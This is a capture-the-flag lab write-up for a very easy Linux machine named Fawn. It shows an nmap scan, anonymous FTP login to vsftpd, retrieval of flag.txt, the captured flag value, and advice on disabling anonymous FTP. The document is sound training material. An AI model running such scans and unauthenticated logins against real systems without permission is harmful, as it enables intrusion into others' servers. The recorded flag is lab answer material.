# Fawn

**OS:** Linux | **Difficulty:** Very Easy | **Date:** 21/04/2026

## Summary

Fawn was a **Very Easy** machine that demonstrated risks of insecure FTP service configurations. The exploitation was straightforward: identification of an exposed FTP service with anonymous login enabled, allowing unauthenticated access to files.

**Key points:**
- FTP service (port 21) exposed with anonymous login enabled
- `flag.txt` publicly accessible without authentication
- Basic misconfiguration exposing sensitive files

## Reconnaissance

### Nmap Scan

```bash
nmap -sV -sC -p- --min-rate 5000 -oN nmap_full.txt 10.129.19.3
```

**Result:**

```
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 0        0              32 Jun 04  2021 flag.txt
Service Info: OS: Unix
```

![Nmap scan](screenshots/nmap.png)

The scan revealed only one open port: **21/tcp** running FTP (vsftpd 3.0.3), with anonymous login enabled and `flag.txt` listed directly.

## Enumeration

With the FTP service identified, anonymous access was tested:

```bash
ftp 10.129.19.3
# Name: anonymous
# Password: <empty>
```

During enumeration, it was discovered that:
- Anonymous login was enabled without restrictions
- `flag.txt` was listed in the FTP root directory
- The server negotiates **Extended Passive Mode (EPSV)** automatically
- The FTP client switched to **binary mode** for the transfer

## Exploitation

### Initial Access

Access to the FTP server was obtained via anonymous login:

```bash
ftp 10.129.19.3
# Name: anonymous
# Password: <empty>
```

### Flag Collection

After login, the file was downloaded and read locally:

```bash
ftp> ls                  # lists flag.txt (32 bytes, Jun 04 2021)
ftp> get flag.txt        # download via EPSV; 32 bytes received in 00:00
ftp> bye                 # 221 Goodbye.
$ cat flag.txt
```

![FTP session](screenshots/ftp.png)

![Flag](screenshots/flag.png)

## Privilege Escalation

N/A

## Flags

- **Flag:** `035db21c881520061c53e0536e44f815`

## Lessons Learned

- **Vulnerability:** Anonymous FTP was enabled, allowing anyone to list and download files without credentials; `flag.txt` was stored directly in the FTP root with world-readable permissions
- **Real world:** Anonymous FTP is still found on misconfigured file servers and legacy network devices in corporate environments, often exposing configuration files, backups, or internal documents
- **Defense:** Disable anonymous login (`anonymous_enable=NO` in vsftpd.conf); replace FTP with SFTP or FTPS; restrict FTP access via firewall; audit file permissions on any exposed network service

### Useful Commands

```bash
# Nmap scan with scripts and version detection
nmap -sV -sC -p- --min-rate 5000 -oN nmap_full.txt 10.129.19.3
```

```bash
# Anonymous FTP connection
ftp 10.129.19.3
```

```bash
# Useful FTP commands
ls            # list files
get flag.txt  # download file
bye           # end session
```
